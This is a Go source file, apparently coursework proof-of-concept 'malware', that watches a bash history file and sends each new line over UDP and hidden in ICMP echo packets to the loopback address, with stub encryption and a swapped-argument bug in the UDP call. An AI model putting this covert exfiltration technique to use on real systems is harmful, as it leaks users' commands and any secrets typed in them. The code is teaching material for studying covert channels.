package client

// This is a small script/malware made
// for a Covert Channel course as a PoC
// for covert communications in a system.
// The idea is to send bash history through
// the loopback interface.

import (
	"fmt"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"log"
	"net"
	"bufio"
	"os"
	"time"
)


// readLines reads a whole file into memory
// and returns a slice of its lines.
func readLines(path string) ([]string) {
	file, err := os.Open(path)

	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	file.Close()

	return txtlines
}

func sendUDP( ip string, m string) {
	p :=  make([]byte, 2048)
	conn, err := net.Dial("udp", ip)
	if err != nil {
		fmt.Printf("Some error %v", err)
		return
	}
	fmt.Fprintf(conn, m)
	_, err = bufio.NewReader(conn).Read(p)
	if err == nil {
		fmt.Printf("%s\n", p)
	} else {
		fmt.Printf("Some error %v\n", err)
	}
	conn.Close()
}

func encrypt(data []byte, passphrase string) []byte {
	return data
}

func decrypt(data []byte, passphrase string) []byte {
	return data
}

func sendICMP(addr string, data string) (*net.IPAddr, error) {
	// Start listening for icmp replies
	c, err := icmp.ListenPacket("ip4:icmp", ListenAddr)
	if err != nil {
		return nil, err
	}
	defer c.Close()

	// Resolve any DNS (if used) and get the real IP of the target
	dst, err := net.ResolveIPAddr("ip4", addr)
	if err != nil {
		panic(err)
		return nil, err
	}

	encrptedData := encrypt([]byte(data), key)
	fmt.Println("Sent:")
	fmt.Println(encrptedData)
	// Make a new ICMP message
	m := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: 0xffff, Seq: 1, //<< uint(seq), // TODO
			Data: []byte(encrptedData),
		},
	}

	b, err := m.Marshal(nil)
	if err != nil {
		return dst, err
	}

	// Send it
	n, err := c.WriteTo(b, dst)
	if err != nil {
		return dst, err
	} else if n != len(b) {
		return dst, fmt.Errorf("got %v; want %v", n, len(b))
	}

	return dst, err
}



var ListenAddr = "0.0.0.0"
var key = "2345678913221"

func client() {

	/// idea:
	///
	/// for every min:
	/// read .history
	/// set tmp_wlc = len(.history)
	/// if tmp_wlc > wlc:
	/// 	for every line
	///         if the current i is > wlc:
	///				send()
	/// wlc = tmp_wlc
	///


	/// Debug:
	lines := readLines("/tmp/.bash_history")
	//tmp_wlc := len(lines)
	for _, eachline := range lines {
		fmt.Println(eachline)
	}
	fmt.Println("After all")

	wlc := 0
	for {
		lines := readLines("/tmp/.bash_history")
		tmp_wlc := len(lines)
		if (tmp_wlc > wlc) {
			for i, line := range lines {
				if (i >= (wlc) ){
					/// Debug:
					fmt.Println(i,line)
					// Send the data through UDP
					sendUDP(line,"127.0.0.1:1234")
					// Send the data through ICMP
					sendICMP("127.0.0.1",line)
				}
			}
			wlc = tmp_wlc
		}
		// Update 
		time.Sleep(time.Minute * 1)
	}
}
